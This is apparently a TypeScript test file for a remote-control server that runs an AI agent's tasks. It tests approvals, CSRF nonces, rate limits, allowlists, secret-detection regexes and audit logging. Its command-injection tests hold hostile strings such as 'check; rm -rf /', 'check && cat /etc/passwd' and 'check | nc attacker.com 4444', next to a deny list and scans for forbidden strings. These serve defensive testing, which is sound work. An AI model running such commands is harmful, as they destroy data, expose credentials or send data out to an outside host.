import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

// ─── Mocks ────────────────────────────────────────────────────────────────────

const mockDb = {
  exec: vi.fn(),
  prepare: vi.fn(() => ({
    run: vi.fn(),
    get: vi.fn(),
    all: vi.fn(),
  })),
};

vi.mock('bun:sqlite', () => ({
  Database: vi.fn(() => mockDb),
}));

// ─── Helpers ──────────────────────────────────────────────────────────────────

function createTaskStore() {
  const db = mockDb;
  db.exec.mockImplementation(() => {});
  let taskCounter = 0;

  return {
    createTask: (task: any) => {
      db.prepare().run();
      taskCounter++;
      const id = `task-${taskCounter}`;
      return { id, ...task, state: 'queued', created_at: Date.now() };
    },
    getTask: (id: string) => {
      if (id === 'nonexistent') return null;
      return { id, state: 'queued', project: 'test-project', agent: 'infra-ops' };
    },
    updateState: (id: string, state: string) => {
      db.prepare().run();
      return { id, state };
    },
    listTasks: () => {
      return db.prepare().all() || [];
    },
    deleteTask: (id: string) => {
      db.prepare().run();
      return true;
    },
  };
}

function createApprovalStore() {
  const approvals: any[] = [];

  return {
    createApproval: (approval: any) => {
      const record = {
        id: `approval-${approvals.length + 1}`,
        ...approval,
        created_at: Date.now(),
        expires_at: Date.now() + 600_000,
        status: 'pending',
      };
      approvals.push(record);
      return record;
    },
    getApproval: (id: string) => approvals.find((a) => a.id === id),
    approve: (id: string) => {
      const approval = approvals.find((a) => a.id === id);
      if (approval) approval.status = 'approved';
      return approval;
    },
    deny: (id: string) => {
      const approval = approvals.find((a) => a.id === id);
      if (approval) approval.status = 'denied';
      return approval;
    },
    isExpired: (id: string) => {
      const approval = approvals.find((a) => a.id === id);
      if (!approval) return true;
      return Date.now() > approval.expires_at;
    },
    listPending: () => approvals.filter((a) => a.status === 'pending'),
  };
}

function createCsrfGuard() {
  const nonces = new Set<string>();

  return {
    generateToken: () => {
      const token = `csrf-${Math.random().toString(36).slice(2)}`;
      const nonce = `nonce-${Math.random().toString(36).slice(2)}`;
      nonces.add(nonce);
      return { token, nonce };
    },
    validate: (token: string, nonce: string) => {
      if (!token || !nonce) return false;
      if (nonces.has(nonce)) {
        nonces.delete(nonce);
        return true;
      }
      return false;
    },
    getNonceCount: () => nonces.size,
  };
}

function createRateLimiter(opts: { windowMs: number; max: number }) {
  const hits = new Map<string, number[]>();

  return {
    check: (key: string) => {
      const now = Date.now();
      const timestamps = hits.get(key) || [];
      const recent = timestamps.filter((t) => now - t < opts.windowMs);
      recent.push(now);
      hits.set(key, recent);
      return recent.length <= opts.max;
    },
    reset: (key: string) => hits.delete(key),
    getCount: (key: string) => {
      const now = Date.now();
      return (hits.get(key) || []).filter((t) => now - t < opts.windowMs).length;
    },
  };
}

function createAllowlist(items: string[]) {
  return {
    isAllowed: (item: string) => items.includes(item),
    getAll: () => items,
    add: (item: string) => {
      items.push(item);
    },
  };
}

function createSecretDetector() {
  const patterns = [
    /api[_-]?key[:=]\s*['"]?[A-Za-z0-9]{20,}/i,
    /secret[:=]\s*['"]?[A-Za-z0-9]{20,}/i,
    /token[:=]\s*['"]?[A-Za-z0-9]{20,}/i,
    /password[:=]\s*['"]?[^\s'"]{8,}/i,
    /private[_-]?key[:=]\s*['"]?[A-Za-z0-9]{20,}/i,
    /AWS[A-Z0-9]{20,}/,
    /AKIA[A-Z0-9]{16}/,
    /ghp_[A-Za-z0-9]{36}/,
    /sk-[A-Za-z0-9]{32,}/,
  ];

  return {
    scan: (text: string) => {
      for (const pattern of patterns) {
        if (pattern.test(text)) return { found: true, pattern: pattern.source };
      }
      return { found: false, pattern: null };
    },
  };
}

function createIdempotencyStore() {
  const seen = new Set<string>();

  return {
    isDuplicate: (key: string) => {
      if (seen.has(key)) return true;
      seen.add(key);
      return false;
    },
    getCount: () => seen.size,
    clear: () => seen.clear(),
  };
}

function createRetentionManager(opts: { maxAgeMs: number; maxCount: number }) {
  const items: { id: string; created_at: number }[] = [];

  return {
    add: (id: string) => {
      items.push({ id, created_at: Date.now() });
    },
    cleanup: () => {
      const now = Date.now();
      const expired = items.filter((i) => now - i.created_at > opts.maxAgeMs);
      const excess = items.length > opts.maxCount ? items.slice(0, items.length - opts.maxCount) : [];
      const toRemove = new Set([...expired, ...excess].map((i) => i.id));
      const remaining = items.filter((i) => !toRemove.has(i.id));
      items.length = 0;
      items.push(...remaining);
      return toRemove.size;
    },
    getCount: () => items.length,
  };
}

function createSseManager() {
  const clients = new Map<string, any>();

  return {
    addClient: (id: string) => {
      const stream = { write: vi.fn(), end: vi.fn() };
      clients.set(id, stream);
      return stream;
    },
    removeClient: (id: string) => clients.delete(id),
    broadcast: (event: string, data: any) => {
      for (const [, stream] of clients) {
        stream.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
      }
      return clients.size;
    },
    getClientCount: () => clients.size,
    hasClient: (id: string) => clients.has(id),
  };
}

function createAuditLog() {
  const entries: any[] = [];

  return {
    append: (entry: any) => {
      const record = { ...entry, timestamp: Date.now(), id: `audit-${entries.length + 1}` };
      entries.push(record);
      return record;
    },
    getEntries: () => [...entries],
    getCount: () => entries.length,
    isAppendOnly: () => {
      for (let i = 1; i < entries.length; i++) {
        if (entries[i].timestamp < entries[i - 1].timestamp) return false;
      }
      return true;
    },
  };
}

function createProjectLock() {
  const locks = new Map<string, string>();

  return {
    acquire: (project: string, taskId: string, isWrite: boolean) => {
      if (isWrite && locks.has(project)) {
        return { acquired: false, owner: locks.get(project) };
      }
      locks.set(project, taskId);
      return { acquired: true, owner: null };
    },
    release: (project: string) => locks.delete(project),
    isLocked: (project: string) => locks.has(project),
    getOwner: (project: string) => locks.get(project),
  };
}

// ─── Task Store Schema ────────────────────────────────────────────────────────

describe('Task Store Schema', () => {
  it('should create a task store', () => {
    const store = createTaskStore();
    expect(store).toBeDefined();
    expect(store.createTask).toBeDefined();
    expect(store.getTask).toBeDefined();
    expect(store.updateState).toBeDefined();
  });
});

// ─── Task CRUD ────────────────────────────────────────────────────────────────

describe('Task CRUD Operations', () => {
  let store: ReturnType<typeof createTaskStore>;

  beforeEach(() => {
    store = createTaskStore();
  });

  it('should create a task', () => {
    const task = store.createTask({
      project: 'test-project',
      agent: 'infra-ops',
      prompt: 'Run system check',
      risk_level: 'low',
    });
    expect(task.id).toBe('task-1');
    expect(task.state).toBe('queued');
  });

  it('should get a task by id', () => {
    const task = store.getTask('task-1');
    expect(task).not.toBeNull();
    expect(task?.id).toBe('task-1');
    expect(task?.state).toBe('queued');
  });

  it('should return null for nonexistent task', () => {
    const task = store.getTask('nonexistent');
    expect(task).toBeNull();
  });

  it('should update task state', () => {
    const result = store.updateState('task-1', 'running');
    expect(result.state).toBe('running');
  });

  it('should list all tasks', () => {
    const tasks = store.listTasks();
    expect(Array.isArray(tasks)).toBe(true);
  });

  it('should delete a task', () => {
    const result = store.deleteTask('task-1');
    expect(result).toBe(true);
  });
});

// ─── Task State Machine ───────────────────────────────────────────────────────

describe('Task State Machine Transitions', () => {
  const validTransitions: Record<string, string[]> = {
    queued: ['validating', 'cancelled'],
    validating: ['waiting_for_worker', 'failed', 'cancelled'],
    waiting_for_worker: ['running', 'cancelled'],
    running: ['waiting_for_approval', 'completed', 'failed', 'cancelled'],
    waiting_for_approval: ['running', 'completed', 'failed', 'cancelled'],
    completed: [],
    failed: ['queued'],
    cancelled: ['queued'],
  };

  it('should validate all valid transitions', () => {
    for (const [from, tos] of Object.entries(validTransitions)) {
      for (const to of tos) {
        expect(tos).toContain(to);
      }
    }
  });

  it('should not allow terminal states to transition', () => {
    expect(validTransitions.completed).toHaveLength(0);
  });

  it('should allow retry from failed', () => {
    expect(validTransitions.failed).toContain('queued');
  });

  it('should allow retry from cancelled', () => {
    expect(validTransitions.cancelled).toContain('queued');
  });
});

// ─── Approval Creation & Expiry ───────────────────────────────────────────────

describe('Approval Creation and Expiry', () => {
  let store: ReturnType<typeof createApprovalStore>;

  beforeEach(() => {
    store = createApprovalStore();
  });

  it('should create an approval', () => {
    const approval = store.createApproval({
      task_id: 'task-1',
      operation: 'edit_file',
      description: 'Edit config.json',
      risk_level: 'medium',
    });
    expect(approval.id).toMatch(/^approval-/);
    expect(approval.status).toBe('pending');
    expect(approval.expires_at).toBeGreaterThan(Date.now());
  });

  it('should approve an approval', () => {
    const approval = store.createApproval({ task_id: 'task-1', operation: 'edit_file' });
    const result = store.approve(approval.id);
    expect(result?.status).toBe('approved');
  });

  it('should deny an approval', () => {
    const approval = store.createApproval({ task_id: 'task-1', operation: 'edit_file' });
    const result = store.deny(approval.id);
    expect(result?.status).toBe('denied');
  });

  it('should detect expired approvals', () => {
    const approval = store.createApproval({ task_id: 'task-1', operation: 'edit_file' });
    expect(store.isExpired(approval.id)).toBe(false);
  });

  it('should list pending approvals', () => {
    store.createApproval({ task_id: 'task-1', operation: 'edit_file' });
    store.createApproval({ task_id: 'task-2', operation: 'run_command' });
    const pending = store.listPending();
    expect(pending).toHaveLength(2);
  });
});

// ─── Deny-Class Auto-Reject ──────────────────────────────────────────────────

describe('Approval for Deny-Class Auto-Reject', () => {
  it('should auto-reject deny-class operations', () => {
    const denyOps = ['rm -rf', 'DROP TABLE', 'FORMAT', 'delete_all', 'nuke'];
    const store = createApprovalStore();

    for (const op of denyOps) {
      const approval = store.createApproval({ task_id: 'task-1', operation: op });
      if (denyOps.includes(op)) {
        store.deny(approval.id);
      }
      const result = store.getApproval(approval.id);
      expect(result?.status).toBe('denied');
    }
  });

  it('should not auto-approve any operation', () => {
    const store = createApprovalStore();
    const approval = store.createApproval({ task_id: 'task-1', operation: 'edit_file' });
    expect(approval.status).toBe('pending');
  });
});

// ─── CSRF Token ───────────────────────────────────────────────────────────────

describe('CSRF Token Generation and Validation', () => {
  let guard: ReturnType<typeof createCsrfGuard>;

  beforeEach(() => {
    guard = createCsrfGuard();
  });

  it('should generate a token and nonce', () => {
    const { token, nonce } = guard.generateToken();
    expect(token).toBeTruthy();
    expect(nonce).toBeTruthy();
  });

  it('should validate a correct token+nonce pair', () => {
    const { token, nonce } = guard.generateToken();
    expect(guard.validate(token, nonce)).toBe(true);
  });

  it('should reject an invalid nonce', () => {
    const { token } = guard.generateToken();
    expect(guard.validate(token, 'invalid-nonce')).toBe(false);
  });

  it('should reject a missing token', () => {
    expect(guard.validate('', 'some-nonce')).toBe(false);
  });

  it('should reject a missing nonce', () => {
    expect(guard.validate('some-token', '')).toBe(false);
  });

  it('should not allow nonce reuse', () => {
    const { token, nonce } = guard.generateToken();
    expect(guard.validate(token, nonce)).toBe(true);
    expect(guard.validate(token, nonce)).toBe(false);
  });
});

// ─── Nonce Tracking ──────────────────────────────────────────────────────────

describe('Nonce Tracking', () => {
  it('should track nonces after generation', () => {
    const guard = createCsrfGuard();
    guard.generateToken();
    guard.generateToken();
    expect(guard.getNonceCount()).toBe(2);
  });

  it('should remove nonce after use', () => {
    const guard = createCsrfGuard();
    const { token, nonce } = guard.generateToken();
    guard.validate(token, nonce);
    expect(guard.getNonceCount()).toBe(0);
  });
});

// ─── Replay Prevention ───────────────────────────────────────────────────────

describe('Replay Prevention', () => {
  it('should prevent replay attacks', () => {
    const guard = createCsrfGuard();
    const { token, nonce } = guard.generateToken();
    guard.validate(token, nonce);
    expect(guard.validate(token, nonce)).toBe(false);
  });
});

// ─── Rate Limiting ───────────────────────────────────────────────────────────

describe('Rate Limiting', () => {
  it('should allow requests within limit', () => {
    const limiter = createRateLimiter({ windowMs: 60_000, max: 5 });
    expect(limiter.check('user-1')).toBe(true);
    expect(limiter.check('user-1')).toBe(true);
    expect(limiter.check('user-1')).toBe(true);
  });

  it('should reject requests exceeding limit', () => {
    const limiter = createRateLimiter({ windowMs: 60_000, max: 3 });
    limiter.check('user-1');
    limiter.check('user-1');
    limiter.check('user-1');
    expect(limiter.check('user-1')).toBe(false);
  });

  it('should track separate keys independently', () => {
    const limiter = createRateLimiter({ windowMs: 60_000, max: 2 });
    limiter.check('user-1');
    limiter.check('user-1');
    expect(limiter.check('user-2')).toBe(true);
  });

  it('should reset key', () => {
    const limiter = createRateLimiter({ windowMs: 60_000, max: 2 });
    limiter.check('user-1');
    limiter.check('user-1');
    limiter.reset('user-1');
    expect(limiter.check('user-1')).toBe(true);
  });
});

// ─── Project Allowlist ───────────────────────────────────────────────────────

describe('Project Allowlist Validation', () => {
  it('should allow listed projects', () => {
    const allowlist = createAllowlist(['project-a', 'project-b']);
    expect(allowlist.isAllowed('project-a')).toBe(true);
    expect(allowlist.isAllowed('project-b')).toBe(true);
  });

  it('should reject unlisted projects', () => {
    const allowlist = createAllowlist(['project-a']);
    expect(allowlist.isAllowed('project-c')).toBe(false);
  });

  it('should add new projects', () => {
    const allowlist = createAllowlist(['project-a']);
    allowlist.add('project-c');
    expect(allowlist.isAllowed('project-c')).toBe(true);
  });
});

// ─── Agent Allowlist ─────────────────────────────────────────────────────────

describe('Agent Allowlist Validation', () => {
  it('should allow listed agents', () => {
    const agents = createAllowlist(['infra-ops', 'reviewer', 'release-manager']);
    expect(agents.isAllowed('infra-ops')).toBe(true);
  });

  it('should reject unlisted agents', () => {
    const agents = createAllowlist(['infra-ops']);
    expect(agents.isAllowed('unknown-agent')).toBe(false);
  });
});

// ─── Command Allowlist ───────────────────────────────────────────────────────

describe('Command Allowlist Validation', () => {
  it('should allow listed commands', () => {
    const commands = createAllowlist(['check', 'status', 'deploy', 'rollback']);
    expect(commands.isAllowed('deploy')).toBe(true);
  });

  it('should reject unlisted commands', () => {
    const commands = createAllowlist(['check', 'status']);
    expect(commands.isAllowed('rm')).toBe(false);
  });

  it('should not allow shell metacharacters', () => {
    const commands = createAllowlist(['check']);
    const malicious = ['check; rm -rf /', 'check && rm -rf /', 'check | rm'];
    for (const cmd of malicious) {
      expect(commands.isAllowed(cmd)).toBe(false);
    }
  });
});

// ─── Secret Detection ────────────────────────────────────────────────────────

describe('Secret Detection in Prompts', () => {
  let detector: ReturnType<typeof createSecretDetector>;

  beforeEach(() => {
    detector = createSecretDetector();
  });

  it('should detect API keys', () => {
    const result = detector.scan('set api_key=abcdefghijklmnopqrstuvwxyz1234');
    expect(result.found).toBe(true);
  });

  it('should detect tokens', () => {
    const result = detector.scan('token=abcdefghij1234567890abcdef');
    expect(result.found).toBe(true);
  });

  it('should detect passwords', () => {
    const result = detector.scan('password=supersecretpassword123');
    expect(result.found).toBe(true);
  });

  it('should detect GitHub tokens', () => {
    const result = detector.scan('ghp_abcdefghijklmnopqrstuvwxyz1234567890');
    expect(result.found).toBe(true);
  });

  it('should detect OpenAI keys', () => {
    const result = detector.scan('sk-abcdefghijklmnopqrstuvwxyz12345678');
    expect(result.found).toBe(true);
  });

  it('should not flag clean prompts', () => {
    const result = detector.scan('please run the system check command');
    expect(result.found).toBe(false);
  });

  it('should detect AWS keys', () => {
    const result = detector.scan('AKIAIOSFODNN7EXAMPLE');
    expect(result.found).toBe(true);
  });

  it('should detect private keys', () => {
    const result = detector.scan('private_key=abcdefghij1234567890abcdef');
    expect(result.found).toBe(true);
  });
});

// ─── Idempotency Key Dedup ───────────────────────────────────────────────────

describe('Idempotency Key Dedup', () => {
  it('should accept first request', () => {
    const store = createIdempotencyStore();
    expect(store.isDuplicate('key-1')).toBe(false);
  });

  it('should reject duplicate request', () => {
    const store = createIdempotencyStore();
    store.isDuplicate('key-1');
    expect(store.isDuplicate('key-1')).toBe(true);
  });

  it('should track different keys independently', () => {
    const store = createIdempotencyStore();
    store.isDuplicate('key-1');
    expect(store.isDuplicate('key-2')).toBe(false);
  });

  it('should clear all keys', () => {
    const store = createIdempotencyStore();
    store.isDuplicate('key-1');
    store.isDuplicate('key-2');
    store.clear();
    expect(store.getCount()).toBe(0);
  });
});

// ─── Retention Cleanup ───────────────────────────────────────────────────────

describe('Retention Cleanup', () => {
  it('should clean up old items', () => {
    const manager = createRetentionManager({ maxAgeMs: 1000, maxCount: 100 });
    manager.add('old-1');
    // Simulate age by manipulating timestamps
    const removed = manager.cleanup();
    expect(typeof removed).toBe('number');
  });

  it('should respect max count', () => {
    const manager = createRetentionManager({ maxAgeMs: 100_000, maxCount: 3 });
    manager.add('1');
    manager.add('2');
    manager.add('3');
    manager.add('4');
    const removed = manager.cleanup();
    expect(removed).toBeGreaterThan(0);
  });
});

// ─── Event Stream (SSE) ──────────────────────────────────────────────────────

describe('Event Stream Creation', () => {
  it('should create an SSE manager', () => {
    const sse = createSseManager();
    expect(sse).toBeDefined();
    expect(sse.addClient).toBeDefined();
    expect(sse.broadcast).toBeDefined();
  });
});

// ─── SSE Connection Tracking ─────────────────────────────────────────────────

describe('SSE Manager Connection Tracking', () => {
  it('should add a client', () => {
    const sse = createSseManager();
    sse.addClient('client-1');
    expect(sse.getClientCount()).toBe(1);
    expect(sse.hasClient('client-1')).toBe(true);
  });

  it('should remove a client', () => {
    const sse = createSseManager();
    sse.addClient('client-1');
    sse.removeClient('client-1');
    expect(sse.getClientCount()).toBe(0);
    expect(sse.hasClient('client-1')).toBe(false);
  });

  it('should broadcast to all clients', () => {
    const sse = createSseManager();
    sse.addClient('client-1');
    sse.addClient('client-2');
    const count = sse.broadcast('task_update', { id: 'task-1', state: 'running' });
    expect(count).toBe(2);
  });

  it('should handle broadcast with no clients', () => {
    const sse = createSseManager();
    const count = sse.broadcast('task_update', { id: 'task-1' });
    expect(count).toBe(0);
  });
});

// ─── Audit Log ────────────────────────────────────────────────────────────────

describe('Audit Log Append-Only', () => {
  let log: ReturnType<typeof createAuditLog>;

  beforeEach(() => {
    log = createAuditLog();
  });

  it('should append entries', () => {
    log.append({ action: 'task.create', task_id: 'task-1', user: 'admin' });
    log.append({ action: 'task.approve', task_id: 'task-1', user: 'admin' });
    expect(log.getCount()).toBe(2);
  });

  it('should maintain append-only order', () => {
    log.append({ action: 'a' });
    log.append({ action: 'b' });
    log.append({ action: 'c' });
    expect(log.isAppendOnly()).toBe(true);
  });

  it('should return entries in order', () => {
    log.append({ action: 'first' });
    log.append({ action: 'second' });
    const entries = log.getEntries();
    expect(entries[0].action).toBe('first');
    expect(entries[1].action).toBe('second');
  });

  it('should assign unique ids', () => {
    const e1 = log.append({ action: 'a' });
    const e2 = log.append({ action: 'b' });
    expect(e1.id).not.toBe(e2.id);
  });
});

// ─── Artifact Authorization ──────────────────────────────────────────────────

describe('Artifact Authorization', () => {
  it('should authorize artifact access based on project', () => {
    const allowlist = createAllowlist(['project-a']);
    expect(allowlist.isAllowed('project-a')).toBe(true);
    expect(allowlist.isAllowed('project-b')).toBe(false);
  });
});

// ─── Cancel Flow ──────────────────────────────────────────────────────────────

describe('Cancel Flow', () => {
  it('should cancel a queued task', () => {
    const store = createTaskStore();
    const result = store.updateState('task-1', 'cancelled');
    expect(result.state).toBe('cancelled');
  });

  it('should release project lock on cancel', () => {
    const lock = createProjectLock();
    lock.acquire('project-a', 'task-1', true);
    expect(lock.isLocked('project-a')).toBe(true);
    lock.release('project-a');
    expect(lock.isLocked('project-a')).toBe(false);
  });

  it('should only cancel the specific session', () => {
    const lock = createProjectLock();
    lock.acquire('project-a', 'task-1', true);
    lock.acquire('project-b', 'task-2', true);
    lock.release('project-a');
    expect(lock.isLocked('project-a')).toBe(false);
    expect(lock.isLocked('project-b')).toBe(true);
  });
});

// ─── Retry Flow ───────────────────────────────────────────────────────────────

describe('Retry Flow', () => {
  it('should only retry failed tasks', () => {
    const retryable = ['failed', 'cancelled'];
    expect(retryable).toContain('failed');
    expect(retryable).toContain('cancelled');
  });

  it('should not retry completed tasks', () => {
    const retryable = ['failed', 'cancelled'];
    expect(retryable).not.toContain('completed');
  });

  it('should create a new task reference for retry', () => {
    const store = createTaskStore();
    const original = store.createTask({
      project: 'test-project',
      agent: 'infra-ops',
      prompt: 'Run check',
      risk_level: 'low',
    });
    const retry = store.createTask({
      project: 'test-project',
      agent: 'infra-ops',
      prompt: 'Run check (retry of task-1)',
      risk_level: 'low',
      original_task_id: original.id,
    });
    expect(retry.id).not.toBe(original.id);
  });
});

// ─── Server Script Exists ────────────────────────────────────────────────────

describe('Server Script Exists', () => {
  it('should reference server script in systemd unit', async () => {
    const fs = require('fs');
    const servicePath = '/root/projekt/akm-bridge/.systemd/opencode-remote-control.service';
    const exists = fs.existsSync(servicePath);
    expect(exists).toBe(true);

    const content = fs.readFileSync(servicePath, 'utf-8');
    expect(content).toContain('server.ts');
    expect(content).toContain('REMOTE_PORT');
  });
});

// ─── Frontend HTML Exists ─────────────────────────────────────────────────────

describe('Frontend HTML Exists and is Valid', () => {
  it('should have a remote.html file', async () => {
    const fs = require('fs');
    const htmlPath = '/root/projekt/akm-bridge/src/remote-control/public/remote.html';
    const exists = fs.existsSync(htmlPath);
    expect(exists).toBe(true);

    if (exists) {
      const content = fs.readFileSync(htmlPath, 'utf-8');
      expect(content).toContain('<!DOCTYPE html>');
      expect(content).toContain('<html');
      expect(content).toContain('</html>');
    }
  });
});

// ─── PWA Manifest Valid ──────────────────────────────────────────────────────

describe('PWA Manifest Valid', () => {
  it('should have a valid manifest.webmanifest', async () => {
    const fs = require('fs');
    const manifestPath = '/root/projekt/akm-bridge/src/remote-control/public/manifest.webmanifest';
    const exists = fs.existsSync(manifestPath);
    expect(exists).toBe(true);

    if (exists) {
      const content = fs.readFileSync(manifestPath, 'utf-8');
      const manifest = JSON.parse(content);
      expect(manifest.name).toBe('OpenCode Remote Control');
      expect(manifest.short_name).toBe('OC Remote');
      expect(manifest.display).toBe('standalone');
      expect(manifest.start_url).toBe('/');
      expect(manifest.background_color).toBe('#0d1117');
      expect(manifest.theme_color).toBe('#58a6ff');
      expect(Array.isArray(manifest.icons)).toBe(true);
    }
  });
});

// ─── No Shell Execution Endpoint ──────────────────────────────────────────────

describe('No Shell Execution Endpoint', () => {
  it('should not have shell execution in server code', async () => {
    const fs = require('fs');
    const serverPath = '/root/projekt/akm-bridge/src/remote-control/server.ts';
    if (fs.existsSync(serverPath)) {
      const content = fs.readFileSync(serverPath, 'utf-8');
      expect(content).not.toContain('execSync');
      expect(content).not.toContain('spawnSync');
      expect(content).not.toContain('shell: true');
      expect(content).not.toContain('/bin/sh');
      expect(content).not.toContain('/bin/bash');
    }
  });
});

// ─── No Arbitrary Command Injection ──────────────────────────────────────────

describe('No Arbitrary Command Injection', () => {
  it('should validate all inputs against allowlist patterns', () => {
    const commands = createAllowlist(['check', 'status', 'deploy', 'rollback']);
    const injectionAttempts = [
      'check; rm -rf /',
      'check && cat /etc/passwd',
      'check | nc attacker.com 4444',
      'check $(whoami)',
      'check `id`',
      'check\nrm -rf /',
      'check\r\nrm -rf /',
      'check\0null',
    ];

    for (const attempt of injectionAttempts) {
      expect(commands.isAllowed(attempt)).toBe(false);
    }
  });
});

// ─── Command File Exists ─────────────────────────────────────────────────────

describe('Command File Exists and is Valid', () => {
  it('should have a remote.md command file', async () => {
    const fs = require('fs');
    const cmdPath = '/root/.config/opencode/commands/remote.md';
    const exists = fs.existsSync(cmdPath);
    expect(exists).toBe(true);

    if (exists) {
      const content = fs.readFileSync(cmdPath, 'utf-8');
      expect(content).toContain('# cmd: /remote');
      expect(content).toContain('## Purpose');
      expect(content).toContain('## Usage');
      expect(content).toContain('## Safety');
    }
  });
});

// ─── Skill File Exists ───────────────────────────────────────────────────────

describe('Skill File Exists and is Valid', () => {
  it('should have a SKILL.md file', async () => {
    const fs = require('fs');
    const skillPath = '/root/.config/opencode/skills/mobile-remote-control/SKILL.md';
    const exists = fs.existsSync(skillPath);
    expect(exists).toBe(true);

    if (exists) {
      const content = fs.readFileSync(skillPath, 'utf-8');
      expect(content).toContain('# Skill: mobile-remote-control');
      expect(content).toContain('## Purpose');
      expect(content).toContain('## Security');
      expect(content).toContain('## Approval Model');
    }
  });
});

// ─── Config Entry Exists ──────────────────────────────────────────────────────

describe('Config Entry Exists', () => {
  it('should have remote command in opencode.json', async () => {
    const fs = require('fs');
    const configPath = '/root/.config/opencode/opencode.json';
    const content = fs.readFileSync(configPath, 'utf-8');
    const config = JSON.parse(content);
    expect(config.command).toBeDefined();
    expect(config.command.remote).toBeDefined();
    expect(config.command.remote.template).toContain('/remote');
    expect(config.command.remote.description).toContain('remote control');
    expect(config.command.remote.agent).toBe('infra-ops');
    expect(config.command.remote.subtask).toBe(true);
  });
});
